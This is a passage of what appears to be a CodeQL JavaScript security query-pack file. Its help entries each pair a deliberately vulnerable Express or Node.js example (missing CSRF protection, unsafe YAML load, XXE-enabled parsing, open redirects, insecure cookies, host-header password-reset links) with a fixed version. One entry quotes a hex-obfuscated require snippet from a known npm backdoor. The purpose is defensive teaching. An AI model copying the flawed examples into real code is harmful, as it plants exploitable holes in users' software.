    Use a middleware package such as `lusca.csrf` to protect against CSRF attacks.


    ## Example
    In the example below, the server authenticates users before performing the `changeEmail` POST action:


    ```javascript
    const app = require("express")(),
      cookieParser = require("cookie-parser"),
      bodyParser = require("body-parser"),
      session = require("express-session");

    app.use(cookieParser());
    app.use(bodyParser.urlencoded({ extended: false }));
    app.use(session({ secret: process.env['SECRET'], cookie: { maxAge: 60000 } }));

    // ...

    app.post("/changeEmail", function(req, res) {
      const userId = req.session.id;
      const email = req.body["email"];
      // ... update email associated with userId
    });

    ```
    This is not secure. An attacker can submit a POST `changeEmail` request on behalf of a user who visited a malicious website. Since authentication happens without any action from the user, the `changeEmail` action would be executed, despite not being initiated by the user.

    This vulnerability can be mitigated by installing a CSRF protecting middleware handler:


    ```javascript
    const app = require("express")(),
      cookieParser = require("cookie-parser"),
      bodyParser = require("body-parser"),
      session = require("express-session"),
      csrf = require('lusca').csrf;

    app.use(cookieParser());
    app.use(bodyParser.urlencoded({ extended: false }));
    app.use(session({ secret: process.env['SECRET'], cookie: { maxAge: 60000 } }));
    app.use(csrf());

    // ...

    app.post("/changeEmail", function(req, res) {
      const userId = req.session.id;
      const email = req.body["email"];
      // ... update email associated with userId
    });

    ```

    ## References
    * OWASP: [Cross-Site Request Forgery (CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
    * NPM: [lusca](https://www.npmjs.com/package/lusca)
    * Common Weakness Enumeration: [CWE-352](https://cwe.mitre.org/data/definitions/352.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-367/FileSystemRace.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-367/FileSystemRace.bqrs
  metadata:
    name: Potential file system race condition
    description: |-
      Separately checking the state of a file before operating
                    on it may allow an attacker to modify the file between
                    the two operations.
    kind: problem
    problem.severity: warning
    security-severity: 7.7
    precision: medium
    id: js/file-system-race
    tags: |-
      security
             external/cwe/cwe-367
  queryHelp: |
    # Potential file system race condition
    Often it is necessary to check the state of a file before using it. These checks usually take a file name to be checked, and if the check returns positively, then the file is opened or otherwise operated upon.

    However, in the time between the check and the operation, the underlying file referenced by the file name could be changed by an attacker, causing unexpected behavior.


    ## Recommendation
    Use file descriptors instead of file names whenever possible.


    ## Example
    The following example shows a case where the code checks whether a file inside the `/tmp/` folder exists, and if it doesn't, the file is written to that location.


    ```javascript
    const fs = require("fs");
    const os = require("os");
    const path = require("path");

    const filePath = path.join(os.tmpdir(), "my-temp-file.txt");

    if (!fs.existsSync(filePath)) {
      fs.writeFileSync(filePath, "Hello", { mode: 0o600 });
    }

    ```
    However, in a multi-user environment the file might be created by another user between the existence check and the write.

    This can be avoided by using `fs.open` to get a file descriptor, and then use that file descriptor in the write operation.


    ```javascript
    const fs = require("fs");
    const os = require("os");
    const path = require("path");

    const filePath = path.join(os.tmpdir(), "my-temp-file.txt");

    try {
      const fd = fs.openSync(filePath, fs.O_CREAT | fs.O_EXCL | fs.O_RDWR, 0o600);

      fs.writeFileSync(fd, "Hello");
    } catch (e) {
      // file existed
    }

    ```

    ## References
    * Wikipedia: [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use).
    * The CERT Oracle Secure Coding Standard for C: [ FIO01-C. Be careful using functions that use file names for identification ](https://www.securecoding.cert.org/confluence/display/c/FIO01-C.+Be+careful+using+functions+that+use+file+names+for+identification).
    * NodeJS: [The FS module](https://nodejs.org/api/fs.html).
    * Common Weakness Enumeration: [CWE-367](https://cwe.mitre.org/data/definitions/367.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-377/InsecureTemporaryFile.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-377/InsecureTemporaryFile.bqrs
  metadata:
    name: Insecure temporary file
    description: |-
      Creating a temporary file that is accessible by other users can
       lead to information disclosure and sometimes remote code execution.
    kind: path-problem
    id: js/insecure-temporary-file
    problem.severity: warning
    security-severity: 7.0
    precision: medium
    tags: |-
      external/cwe/cwe-377
             external/cwe/cwe-378
             security
  queryHelp: |
    # Insecure temporary file
    Temporary files created in the operating system's temporary directory are by default accessible to other users. In some cases, this can lead to information exposure, or in the worst case, to remote code execution.


    ## Recommendation
    Use a well-tested library like [tmp](https://www.npmjs.com/package/tmp) for creating temporary files. These libraries ensure both that the file is inaccessible to other users and that the file does not already exist.


    ## Example
    The following example creates a temporary file in the operating system's temporary directory.


    ```javascript
    const fs = require('fs');
    const os = require('os');
    const path = require('path');

    const file = path.join(os.tmpdir(), "test-" + (new Date()).getTime() + ".txt");
    fs.writeFileSync(file, "content");
    ```
    The file created above is accessible to other users, and there is no guarantee that the file does not already exist.

    The below example uses the [tmp](https://www.npmjs.com/package/tmp) library to securely create a temporary file.


    ```javascript
    const fs = require('fs');
    const tmp = require('tmp');

    const file = tmp.fileSync().name;
    fs.writeFileSync(file, "content");
    ```

    ## References
    * Mitre.org: [CWE-377](https://cwe.mitre.org/data/definitions/377.html).
    * NPM: [tmp](https://www.npmjs.com/package/tmp).
    * Common Weakness Enumeration: [CWE-377](https://cwe.mitre.org/data/definitions/377.html).
    * Common Weakness Enumeration: [CWE-378](https://cwe.mitre.org/data/definitions/378.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-384/SessionFixation.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-384/SessionFixation.bqrs
  metadata:
    name: Failure to abandon session
    description: |-
      Reusing an existing session as a different user could allow
                    an attacker to access someone else's account by using
                    their session.
    kind: problem
    problem.severity: warning
    security-severity: 5
    precision: medium
    id: js/session-fixation
    tags: |-
      security
             external/cwe/cwe-384
  queryHelp: |
    # Failure to abandon session
    Reusing a session could allow an attacker to gain unauthorized access to another account. Always ensure that, when a user logs in or out, the current session is abandoned so that a new session may be started.


    ## Recommendation
    Always use `req.session.regenerate(...);` to start a new session when a user logs in or out.


    ## Example
    The following example shows the previous session being used after authentication. This would allow a previous user to use the new user's account.


    ```javascript
    const express = require('express');
    const session = require('express-session');
    var bodyParser = require('body-parser')
    const app = express();
    app.use(bodyParser.urlencoded({ extended: false }))
    app.use(session({
        secret: 'keyboard cat'
    }));

    app.post('/login', function (req, res) {
        // Check that username password matches
        if (req.body.username === 'admin' && req.body.password === 'admin') {
            req.session.authenticated = true;
            res.redirect('/');
        } else {
            res.redirect('/login');
        }
    });
    ```
    This code example solves the problem by not reusing the session, and instead calling `req.session.regenerate()` to ensure that the session is not reused.


    ```javascript
    const express = require('express');
    const session = require('express-session');
    var bodyParser = require('body-parser')
    const app = express();
    app.use(bodyParser.urlencoded({ extended: false }))
    app.use(session({
        secret: 'keyboard cat'
    }));

    app.post('/login', function (req, res) {
        // Check that username password matches
        if (req.body.username === 'admin' && req.body.password === 'admin') {
            req.session.regenerate(function (err) {
                if (err) {
                    res.send('Error');
                } else {
                    req.session.authenticated = true;
                    res.redirect('/');
                }
            });
        } else {
            res.redirect('/login');
        }
    });
    ```

    ## References
    * OWASP: [Session fixation](https://www.owasp.org/index.php/Session_fixation)
    * Stack Overflow: [Creating a new session after authentication with Passport](https://stackoverflow.com/questions/22209354/creating-a-new-session-after-authentication-with-passport/30468384#30468384)
    * jscrambler.com: [Best practices for secure session management in Node](https://blog.jscrambler.com/best-practices-for-secure-session-management-in-node)
    * Common Weakness Enumeration: [CWE-384](https://cwe.mitre.org/data/definitions/384.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-400/DeepObjectResourceExhaustion.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-400/DeepObjectResourceExhaustion.bqrs
  metadata:
    name: Resources exhaustion from deep object traversal
    description: Processing user-controlled object hierarchies inefficiently can lead
      to denial of service.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.5
    precision: high
    id: js/resource-exhaustion-from-deep-object-traversal
    tags: |-
      security
             external/cwe/cwe-400
  queryHelp: "# Resources exhaustion from deep object traversal\nProcessing user-controlled\
    \ data with a method that allocates excessive amounts of memory can lead to denial\
    \ of service.\n\nIf the JSON schema validation library `ajv` is configured with\
    \ `allErrors: true` there is no limit to how many error objects will be allocated.\
    \ An attacker can exploit this by sending an object that deliberately contains\
    \ a huge number of errors, and in some cases, with longer and longer error messages.\
    \ This can cause the service to become unresponsive due to the slow error-checking\
    \ process.\n\n\n## Recommendation\nDo not use `allErrors: true` in production.\n\
    \n\n## Example\nIn the example below, the user-submitted object `req.body` is\
    \ validated using `ajv` and `allErrors: true`:\n\n\n```javascript\nimport express\
    \ from 'express';\nimport Ajv from 'ajv';\n\nlet ajv = new Ajv({ allErrors: true\
    \ });\najv.addSchema(require('./input-schema'), 'input');\n\nvar app = express();\n\
    app.get('/user/:id', function(req, res) {\n\tif (!ajv.validate('input', req.body))\
    \ {\n\t\tres.end(ajv.errorsText());\n\t\treturn;\n\t}\n\t// ...\n});\n\n```\n\
    Although this ensures that `req.body` conforms to the schema, the validation itself\
    \ could be vulnerable to a denial-of-service attack. An attacker could send an\
    \ object containing so many errors that the server runs out of memory.\n\nA solution\
    \ is to not pass in `allErrors: true`, which means `ajv` will only report the\
    \ first error, not all of them:\n\n\n```javascript\nimport express from 'express';\n\
    import Ajv from 'ajv';\n\nlet ajv = new Ajv({ allErrors: process.env['REST_DEBUG']\
    \ });\najv.addSchema(require('./input-schema'), 'input');\n\nvar app = express();\n\
    app.get('/user/:id', function(req, res) {\n\tif (!ajv.validate('input', req.body))\
    \ {\n\t\tres.end(ajv.errorsText());\n\t\treturn;\n\t}\n\t// ...\n});\n\n```\n\n\
    ## References\n* Ajv documentation: [security considerations](https://github.com/ajv-validator/ajv/blob/master/docs/security.md#untrusted-schemas)\n\
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-400/RemotePropertyInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-400/RemotePropertyInjection.bqrs
  metadata:
    name: Remote property injection
    description: |-
      Allowing writes to arbitrary properties of an object may lead to
                    denial-of-service attacks.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.5
    precision: medium
    id: js/remote-property-injection
    tags: |-
      security
             external/cwe/cwe-250
             external/cwe/cwe-400
  queryHelp: "# Remote property injection\nDynamically computing object property names\
    \ from untrusted input may have multiple undesired consequences. For example,\
    \ if the property access is used as part of a write, an attacker may overwrite\
    \ vital properties of objects, such as `__proto__`. This attack is known as *prototype\
    \ pollution attack* and may serve as a vehicle for denial-of-service attacks.\
    \ A similar attack vector, is to replace the `toString` property of an object\
    \ with a primitive. Whenever `toString` is then called on that object, either\
    \ explicitly or implicitly as part of a type coercion, an exception will be raised.\n\
    \nMoreover, if the name of an HTTP header is user-controlled, an attacker may\
    \ exploit this to overwrite security-critical headers such as `Access-Control-Allow-Origin`\
    \ or `Content-Security-Policy`.\n\n\n## Recommendation\nThe most common case in\
    \ which prototype pollution vulnerabilities arise is when JavaScript objects are\
    \ used for implementing map data structures. This case should be avoided whenever\
    \ possible by using the ECMAScript 2015 `Map` instead. When this is not possible,\
    \ an alternative fix is to prepend untrusted input with a marker character such\
    \ as `$`, before using it in properties accesses. In this way, the attacker does\
    \ not have access to built-in properties which do not start with the chosen character.\n\
    \nWhen using user input as part of a header name, a sanitization step should be\
    \ performed on the input to ensure that the name does not clash with existing\
    \ header names such as `Content-Security-Policy`.\n\n\n## Example\nIn the example\
    \ below, the dynamically computed property `prop` is accessed on `myObj` using\
    \ a user-controlled value.\n\n\n```javascript\nvar express = require('express');\n\
    \nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res)\
    \ {\n\tvar prop = req.query.userControlled; // BAD\n\tmyObj[prop] = function()\
    \ {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\nThis is not secure\
    \ since an attacker may exploit this code to overwrite the property `__proto__`\
    \ with an empty function. If this happens, the concatenation in the `console.log`\
    \ argument will fail with a confusing message such as \"Function.prototype.toString\
    \ is not generic\". If the application does not properly handle this error, this\
    \ scenario may result in a serious denial-of-service attack. The fix is to prepend\
    \ the user-controlled string with a marker character such as `$` which will prevent\
    \ arbitrary property names from being overwritten.\n\n\n```javascript\nvar express\
    \ = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id',\
    \ function(req, res) {\n\tvar prop = \"$\" + req.query.userControlled; // GOOD\n\
    \tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n\
    });\n```\n\n## References\n* Prototype pollution attacks: [electron](https://github.com/electron/electron/pull/9287),\
    \ [lodash](https://hackerone.com/reports/310443), [hoek](https://npmjs.com/advisories/566).\n\
    * Penetration testing report: [ header name injection attack](http://seclists.org/pen-test/2009/Mar/67)\n\
    * npm blog post: [ dangers of square bracket notation](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n\
    * Common Weakness Enumeration: [CWE-250](https://cwe.mitre.org/data/definitions/250.html).\n\
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-502/UnsafeDeserialization.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-502/UnsafeDeserialization.bqrs
  metadata:
    name: Deserialization of user-controlled data
    description: |-
      Deserializing user-controlled data may allow attackers to
                    execute arbitrary code.
    kind: path-problem
    problem.severity: warning
    security-severity: 9.8
    precision: high
    id: js/unsafe-deserialization
    tags: |-
      security
             external/cwe/cwe-502
  queryHelp: |
    # Deserialization of user-controlled data
    Deserializing untrusted data using any deserialization framework that allows the construction of arbitrary functions is easily exploitable and, in many cases, allows an attacker to execute arbitrary code.


    ## Recommendation
    Avoid deserialization of untrusted data if at all possible. If the architecture permits it, then use formats like JSON or XML that cannot represent functions. When using YAML or other formats that support the serialization and deserialization of functions, ensure that the parser is configured to disable deserialization of arbitrary functions.


    ## Example
    The following example calls the `load` function of the popular `js-yaml` package on data that comes from an HTTP request and hence is inherently unsafe.


    ```javascript
    const app = require("express")(),
      jsyaml = require("js-yaml");

    app.get("load", function(req, res) {
      let data = jsyaml.load(req.params.data);
      // ...
    });

    ```
    Using the `safeLoad` function instead (which does not deserialize YAML-encoded functions) removes the vulnerability.


    ```javascript
    const app = require("express")(),
      jsyaml = require("js-yaml");

    app.get("load", function(req, res) {
      let data = jsyaml.safeLoad(req.params.data);
      // ...
    });

    ```

    ## References
    * OWASP vulnerability description: [Deserialization of untrusted data](https://www.owasp.org/index.php/Deserialization_of_untrusted_data).
    * OWASP guidance on deserializing objects: [Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html).
    * Neal Poole: [Code Execution via YAML in JS-YAML Node.js Module](https://nealpoole.com/blog/2013/06/code-execution-via-yaml-in-js-yaml-nodejs-module/).
    * Common Weakness Enumeration: [CWE-502](https://cwe.mitre.org/data/definitions/502.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-506/HardcodedDataInterpretedAsCode.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-506/HardcodedDataInterpretedAsCode.bqrs
  metadata:
    name: Hard-coded data interpreted as code
    description: |-
      Transforming hard-coded data (such as hexadecimal constants) into code
                    to be executed is a technique often associated with backdoors and should
                    be avoided.
    kind: path-problem
    problem.severity: error
    security-severity: 9.1
    precision: medium
    id: js/hardcoded-data-interpreted-as-code
    tags: |-
      security
             external/cwe/cwe-506
  queryHelp: |
    # Hard-coded data interpreted as code
    Interpreting hard-coded data, such as string literals containing hexadecimal numbers, as code or as an import path is typical of malicious backdoor code that has been implanted into an otherwise trusted code base and is trying to hide its true purpose from casual readers or automated scanning tools.


    ## Recommendation
    Examine the code in question carefully to ascertain its provenance and its true purpose. If the code is benign, it should always be possible to rewrite it without relying on dynamically interpreting data as code, improving both clarity and safety.


    ## Example
    As an example of malicious code using this obfuscation technique, consider the following simplified version of a snippet of backdoor code that was discovered in a dependency of the popular `event-stream` npm package:


    ```javascript
    var r = require;

    function e(r) {
      return Buffer.from(r, "hex").toString()
    }

    // BAD: hexadecimal constant decoded and interpreted as import path
    var n = r(e("2e2f746573742f64617461"));

    ```
    While this shows only the first few lines of code, it already looks very suspicious since it takes a hard-coded string literal, hex-decodes it and then uses it as an import path. The only reason to do so is to hide the name of the file being imported.


    ## References
    * OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).
    * The npm Blog: [Details about the event-stream incident](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident).
    * Common Weakness Enumeration: [CWE-506](https://cwe.mitre.org/data/definitions/506.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-598/SensitiveGetQuery.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-598/SensitiveGetQuery.bqrs
  metadata:
    name: Sensitive data read from GET request
    description: |-
      Placing sensitive data in a GET request increases the risk of
                    the data being exposed to an attacker.
    kind: problem
    problem.severity: warning
    security-severity: 6.5
    precision: high
    id: js/sensitive-get-query
    tags: |-
      security
             external/cwe/cwe-598
  queryHelp: |
    # Sensitive data read from GET request
    Sensitive information such as user passwords should not be transmitted within the query string of the requested URL. Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing sensitive information into the URL therefore increases the risk that it will be captured by an attacker.


    ## Recommendation
    Use HTTP POST to send sensitive information as part of the request body; for example, as form data.


    ## Example
    The following example shows two route handlers that both receive a username and a password. The first receives this sensitive information from the query parameters of a GET request, which is transmitted in the URL. The second receives this sensitive information from the request body of a POST request.


    ```javascript
    const express = require('express');
    const app = express();
    app.use(require('body-parser').urlencoded({ extended: false }))

    // bad: sensitive information is read from query parameters
    app.get('/login1', (req, res) => {
        const user = req.query.user;
        const password = req.query.password;
        if (checkUser(user, password)) {
            res.send('Welcome');
        } else {
            res.send('Access denied');
        }
    });

    // good: sensitive information is read from post body
    app.post('/login2', (req, res) => {
        const user = req.body.user;
        const password = req.body.password;
        if (checkUser(user, password)) {
            res.send('Welcome');
        } else {
            res.send('Access denied');
        }
    });

    ```

    ## References
    * CWE: [CWE-598: Use of GET Request Method with Sensitive Query Strings](https://cwe.mitre.org/data/definitions/598.html)
    * PortSwigger (Burp): [Password Submitted using GET Method](https://portswigger.net/kb/issues/00400300_password-submitted-using-get-method)
    * OWASP: [Information Exposure through Query Strings in URL](https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url)
    * Common Weakness Enumeration: [CWE-598](https://cwe.mitre.org/data/definitions/598.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-601/ClientSideUrlRedirect.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-601/ClientSideUrlRedirect.bqrs
  metadata:
    name: Client-side URL redirect
    description: |-
      Client-side URL redirection based on unvalidated user input
                    may cause redirection to malicious web sites.
    kind: path-problem
    problem.severity: error
    security-severity: 6.1
    precision: high
    id: js/client-side-unvalidated-url-redirection
    tags: |-
      security
             external/cwe/cwe-079
             external/cwe/cwe-116
             external/cwe/cwe-601
  queryHelp: |
    # Client-side URL redirect
    Redirecting to a URL that is constructed from parts of the DOM that may be controlled by an attacker can facilitate phishing attacks. In these attacks, unsuspecting users can be redirected to a malicious site that looks very similar to the real site they intend to visit, but which is controlled by the attacker.


    ## Recommendation
    To guard against untrusted URL redirection, it is advisable to avoid putting user input directly into a redirect URL. Instead, maintain a list of authorized redirects on the server; then choose from that list based on the user input provided.


    ## Example
    The following example uses a regular expression to extract a query parameter from the document URL, and then uses it to construct a new URL to redirect to without any further validation. This may allow an attacker to craft a link that redirects from a trusted website to some arbitrary website of their choosing, which facilitates phishing attacks:


    ```javascript
    window.location = /.*redirect=([^&]*).*/.exec(document.location.href)[1];

    ```

    ## References
    * OWASP: [ XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
    * Common Weakness Enumeration: [CWE-601](https://cwe.mitre.org/data/definitions/601.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-601/ServerSideUrlRedirect.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-601/ServerSideUrlRedirect.bqrs
  metadata:
    name: Server-side URL redirect
    description: |-
      Server-side URL redirection based on unvalidated user input
                    may cause redirection to malicious web sites.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.1
    id: js/server-side-unvalidated-url-redirection
    tags: |-
      security
             external/cwe/cwe-601
    precision: high
  queryHelp: |
    # Server-side URL redirect
    Directly incorporating user input into a URL redirect request without validating the input can facilitate phishing attacks. In these attacks, unsuspecting users can be redirected to a malicious site that looks very similar to the real site they intend to visit, but which is controlled by the attacker.


    ## Recommendation
    To guard against untrusted URL redirection, it is advisable to avoid putting user input directly into a redirect URL. Instead, maintain a list of authorized redirects on the server; then choose from that list based on the user input provided.

    If this is not possible, then the user input should be validated in some other way, for example, by verifying that the target URL is on the same host as the current page.


    ## Example
    The following example shows an HTTP request parameter being used directly in a URL redirect without validating the input, which facilitates phishing attacks:


    ```javascript
    const app = require("express")();

    app.get("/redirect", function (req, res) {
      // BAD: a request parameter is incorporated without validation into a URL redirect
      res.redirect(req.query["target"]);
    });

    ```
    One way to remedy the problem is to validate the user input against a known fixed string before doing the redirection:


    ```javascript
    const app = require("express")();

    const VALID_REDIRECT = "http://cwe.mitre.org/data/definitions/601.html";

    app.get("/redirect", function (req, res) {
      // GOOD: the request parameter is validated against a known fixed string
      let target = req.query["target"];
      if (VALID_REDIRECT === target) {
        res.redirect(target);
      } else {
        res.redirect("/");
      }
    });

    ```
    Alternatively, we can check that the target URL does not redirect to a different host by parsing it relative to a base URL with a known host and verifying that the host stays the same:


    ```javascript
    const app = require("express")();

    function isLocalUrl(path) {
      try {
        return (
          // TODO: consider substituting your own domain for example.com
          new URL(path, "https://example.com").origin === "https://example.com"
        );
      } catch (e) {
        return false;
      }
    }

    app.get("/redirect", function (req, res) {
      // GOOD: check that we don't redirect to a different host
      let target = req.query["target"];
      if (isLocalUrl(target)) {
        res.redirect(target);
      } else {
        res.redirect("/");
      }
    });

    ```
    Note that as written, the above code will allow redirects to URLs on `example.com`, which is harmless but perhaps not intended. You can substitute your own domain (if known) for `example.com` to prevent this.


    ## References
    * OWASP: [ XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).
    * Common Weakness Enumeration: [CWE-601](https://cwe.mitre.org/data/definitions/601.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-611/Xxe.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-611/Xxe.bqrs
  metadata:
    name: XML external entity expansion
    description: |-
      Parsing user input as an XML document with external
                    entity expansion is vulnerable to XXE attacks.
    kind: path-problem
    problem.severity: error
    security-severity: 9.1
    precision: high
    id: js/xxe
    tags: |-
      security
             external/cwe/cwe-611
             external/cwe/cwe-827
  queryHelp: |
    # XML external entity expansion
    Parsing untrusted XML files with a weakly configured XML parser may lead to an XML External Entity (XXE) attack. This type of attack uses external entity references to access arbitrary files on a system, carry out denial-of-service (DoS) attacks, or server-side request forgery. Even when the result of parsing is not returned to the user, DoS attacks are still possible and out-of-band data retrieval techniques may allow attackers to steal sensitive data.


    ## Recommendation
    The easiest way to prevent XXE attacks is to disable external entity handling when parsing untrusted data. How this is done depends on the library being used. Note that some libraries, such as recent versions of `libxml`, disable entity expansion by default, so unless you have explicitly enabled entity expansion, no further action needs to be taken.


    ## Example
    The following example uses the `libxml` XML parser to parse a string `xmlSrc`. If that string is from an untrusted source, this code may be vulnerable to an XXE attack, since the parser is invoked with the `noent` option set to `true`:


    ```javascript
    const app = require("express")(),
      libxml = require("libxmljs");

    app.post("upload", (req, res) => {
      let xmlSrc = req.body,
        doc = libxml.parseXml(xmlSrc, { noent: true });
    });

    ```
    To guard against XXE attacks, the `noent` option should be omitted or set to `false`. This means that no entity expansion is undertaken at all, not even for standard internal entities such as `&amp;` or `&gt;`. If desired, these entities can be expanded in a separate step using utility functions provided by libraries such as [underscore](http://underscorejs.org/#unescape), [lodash](https://lodash.com/docs/4.17.15#unescape) or [he](https://github.com/mathiasbynens/he).


    ```javascript
    const app = require("express")(),
      libxml = require("libxmljs");

    app.post("upload", (req, res) => {
      let xmlSrc = req.body,
        doc = libxml.parseXml(xmlSrc);
    });

    ```

    ## References
    * OWASP: [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing).
    * Timothy Morgen: [XML Schema, DTD, and Entity Attacks](https://research.nccgroup.com/2014/05/19/xml-schema-dtd-and-entity-attacks-a-compendium-of-known-techniques/).
    * Timur Yunusov, Alexey Osipov: [XML Out-Of-Band Data Retrieval](https://www.slideshare.net/qqlan/bh-ready-v4).
    * Common Weakness Enumeration: [CWE-611](https://cwe.mitre.org/data/definitions/611.html).
    * Common Weakness Enumeration: [CWE-827](https://cwe.mitre.org/data/definitions/827.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-614/ClearTextCookie.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-614/ClearTextCookie.bqrs
  metadata:
    name: Clear text transmission of sensitive cookie
    description: |-
      Sending sensitive information in a cookie without requring SSL encryption
                    can expose the cookie to an attacker.
    kind: problem
    problem.severity: warning
    security-severity: 5.0
    precision: high
    id: js/clear-text-cookie
    tags: |-
      security
             external/cwe/cwe-614
             external/cwe/cwe-311
             external/cwe/cwe-312
             external/cwe/cwe-319
  queryHelp: |
    # Clear text transmission of sensitive cookie
    Cookies that are transmitted in clear text can be intercepted by an attacker. If sensitive cookies are intercepted, the attacker can read the cookie and use it to perform actions on the user's behalf.


    ## Recommendation
    Always transmit sensitive cookies using SSL by setting the `secure` attribute on the cookie.


    ## Example
    The following example stores an authentication token in a cookie that can be transmitted in clear text.


    ```javascript
    const http = require('http');

    const server = http.createServer((req, res) => {
        res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}`);
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end('<h2>Hello world</h2>');
    });
    ```
    To force the cookie to be transmitted using SSL, set the `secure` attribute on the cookie.


    ```javascript
    const http = require('http');

    const server = http.createServer((req, res) => {
        res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}; secure; httpOnly`);
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end('<h2>Hello world</h2>');
    });
    ```

    ## References
    * ExpressJS: [Use cookies securely](https://expressjs.com/en/advanced/best-practice-security.html#use-cookies-securely).
    * OWASP: [Set cookie flags appropriately](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html#set-cookie-flags-appropriately).
    * Mozilla: [Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie).
    * Common Weakness Enumeration: [CWE-614](https://cwe.mitre.org/data/definitions/614.html).
    * Common Weakness Enumeration: [CWE-311](https://cwe.mitre.org/data/definitions/311.html).
    * Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).
    * Common Weakness Enumeration: [CWE-319](https://cwe.mitre.org/data/definitions/319.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-640/HostHeaderPoisoningInEmailGeneration.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-640/HostHeaderPoisoningInEmailGeneration.bqrs
  metadata:
    name: Host header poisoning in email generation
    description: |-
      Using the HTTP Host header to construct a link in an email can facilitate phishing
                    attacks and leak password reset tokens.
    kind: path-problem
    problem.severity: error
    security-severity: 9.8
    precision: high
    id: js/host-header-forgery-in-email-generation
    tags: |-
      security
             external/cwe/cwe-640
  queryHelp: |
    # Host header poisoning in email generation
    Using the HTTP Host header to construct a link in an email can facilitate phishing attacks and leak password reset tokens. A malicious user can send an HTTP request to the targeted web site, but with a Host header that refers to his own web site. This means the emails will be sent out to potential victims, originating from a server they trust, but with links leading to a malicious web site.

    If the email contains a password reset link, and should the victim click the link, the secret reset token will be leaked to the attacker. Using the leaked token, the attacker can then construct the real reset link and use it to change the victim's password.


    ## Recommendation
    Obtain the server's host name from a configuration file and avoid relying on the Host header.


    ## Example
    The following example uses the `req.host` to generate a password reset link. This value is derived from the Host header, and can thus be set to anything by an attacker:


    ```javascript
    let nodemailer = require('nodemailer');
    let express = require('express');
    let backend = require('./backend');

    let app = express();

    let config = JSON.parse(fs.readFileSync('config.json', 'utf8'));

    app.post('/resetpass', (req, res) => {
      let email = req.query.email;
      let transport = nodemailer.createTransport(config.smtp);
      let token = backend.getUserSecretResetToken(email);
      transport.sendMail({
        from: 'webmaster@example.com',
        to: email,
        subject: 'Forgot password',
        text: `Click to reset password: https://${req.host}/resettoken/${token}`,
      });
    });

    ```
    To ensure the link refers to the correct web site, get the host name from a configuration file:


    ```javascript
    let nodemailer = require('nodemailer');
    let express = require('express');
    let backend = require('./backend');

    let app = express();

    let config = JSON.parse(fs.readFileSync('config.json', 'utf8'));

    app.post('/resetpass', (req, res) => {
      let email = req.query.email;
      let transport = nodemailer.createTransport(config.smtp);
      let token = backend.getUserSecretResetToken(email);
      transport.sendMail({
        from: 'webmaster@example.com',
        to: email,
